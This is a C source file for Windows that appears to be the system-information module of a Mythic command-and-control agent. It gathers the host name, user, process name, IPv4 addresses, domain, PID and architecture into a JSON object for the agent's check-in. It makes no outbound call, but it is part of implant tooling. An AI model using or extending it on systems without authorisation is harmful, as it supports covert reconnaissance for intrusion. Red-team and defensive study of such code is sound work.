#include "common.h"
#include "sysinfo.h"
#include "cJSON.h"
#include <winsock2.h>
#include <iphlpapi.h>
#include <lmcons.h>

static void get_host(char *dst, size_t cap) {
    DWORD n = (DWORD)cap;
    dst[0] = '\0';
    GetComputerNameA(dst, &n);
}

static void get_user(char *dst, size_t cap) {
    DWORD n = (DWORD)cap;
    dst[0] = '\0';
    GetUserNameA(dst, &n);
}

static void get_process(char *dst, size_t cap) {
    char path[MAX_PATH];
    const char *base;
    dst[0] = '\0';
    if (GetModuleFileNameA(NULL, path, sizeof(path)) == 0)
        return;
    base = strrchr(path, '\\');
    strncpy(dst, base ? base + 1 : path, cap - 1);
    dst[cap - 1] = '\0';
}

/* First non-loopback IPv4s, comma-joined. Mythic wants a list; a single
 * comma string degrades gracefully on agents without JSON arrays here. */
static void get_ips(char *dst, size_t cap) {
    ULONG len = 0;
    IP_ADAPTER_ADDRESSES *addrs = NULL, *a;
    size_t used = 0;
    dst[0] = '\0';
    GetAdaptersAddresses(AF_INET, 0, NULL, NULL, &len);
    if (len == 0)
        return;
    addrs = (IP_ADAPTER_ADDRESSES *)malloc(len);
    if (!addrs)
        return;
    if (GetAdaptersAddresses(AF_INET, 0, NULL, addrs, &len) != NO_ERROR) {
        free(addrs);
        return;
    }
    for (a = addrs; a; a = a->Next) {
        IP_ADAPTER_UNICAST_ADDRESS *u;
        if (a->OperStatus != IfOperStatusUp)
            continue;
        for (u = a->FirstUnicastAddress; u; u = u->Next) {
            struct sockaddr_in *sa = (struct sockaddr_in *)u->Address.lpSockaddr;
            unsigned long ip;
            char tmp[32];
            if (!sa || sa->sin_family != AF_INET)
                continue;
            ip = ntohl(sa->sin_addr.s_addr);
            if ((ip >> 24) == 127)
                continue;
            snprintf(tmp, sizeof(tmp), "%lu.%lu.%lu.%lu",
                     (ip >> 24) & 0xFF, (ip >> 16) & 0xFF, (ip >> 8) & 0xFF, ip & 0xFF);
            if (used > 0 && used + 1 < cap)
                dst[used++] = ',';
            if (used + strlen(tmp) + 1 > cap)
                break;
            strcpy(dst + used, tmp);
            used += strlen(tmp);
        }
    }
    free(addrs);
}

void sysinfo_attach(cJSON *obj) {
    char host[256], user[UNLEN + 1], proc[260], ips[1024], domain[256];
    const char *dom;
    cJSON *arr;
    get_host(host, sizeof(host));
    get_user(user, sizeof(user));
    get_process(proc, sizeof(proc));
    get_ips(ips, sizeof(ips));
    dom = getenv("USERDNSDOMAIN");
    if (!dom || !*dom)
        dom = getenv("USERDOMAIN");
    strncpy(domain, dom ? dom : "", sizeof(domain) - 1);
    domain[sizeof(domain) - 1] = '\0';
    arr = cJSON_CreateStringArray(NULL, 0);
    if (arr) {
        char *p = ips;
        while (*p) {
            char *comma = strchr(p, ',');
            cJSON *s;
            if (comma)
                *comma = '\0';
            s = cJSON_CreateString(p);
            if (s)
                cJSON_AddItemToArray(arr, s);
            if (!comma)
                break;
            p = comma + 1;
        }
        cJSON_AddItemToObject(obj, "ips", arr);
    }
    cJSON_AddStringToObject(obj, "os", "windows");
    cJSON_AddStringToObject(obj, "user", user);
    cJSON_AddStringToObject(obj, "host", host);
    cJSON_AddNumberToObject(obj, "pid", (int)GetCurrentProcessId());
#ifdef _WIN64
    cJSON_AddStringToObject(obj, "architecture", "amd64");
#else
    cJSON_AddStringToObject(obj, "architecture", "386");
#endif
    cJSON_AddStringToObject(obj, "domain", domain);
    cJSON_AddStringToObject(obj, "process_name", proc);
}
